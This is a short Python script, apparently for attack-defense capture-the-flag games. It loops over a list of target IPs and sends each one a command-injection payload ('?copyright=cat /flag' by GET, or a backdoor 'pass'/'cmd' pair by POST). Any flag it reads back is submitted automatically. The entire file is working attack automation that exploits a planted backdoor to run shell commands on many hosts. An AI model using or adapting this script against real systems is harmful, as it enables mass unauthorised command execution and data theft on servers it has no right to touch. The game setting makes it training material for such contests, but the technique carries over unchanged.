from plugin.attack import *
from plugin.submit_flag import *
from plugin.load_file import *

if __name__ == '__main__':

    ## get方法payload ####
    url_path = '/index.php'
    method = 'get'
    payload = '?copyright=cat /flag'
    #####################
    ## post 方法payload ##
    # url_path = 'index.php'
    # method = 'post'
    # payload = {'pass': 'password', 'cmd': 'cat /flag'}
    #####################
    ip_txt = loadfile("./host_list.txt")
    ip_list = ip_txt.split("\n")
    print(ip_list)
    for ip in ip_list:
        if ip:
            flag = backdoor_attack(ip, url_path, method, payload)
            if flag != False:
                submit(ip, flag)
            else:
                continue
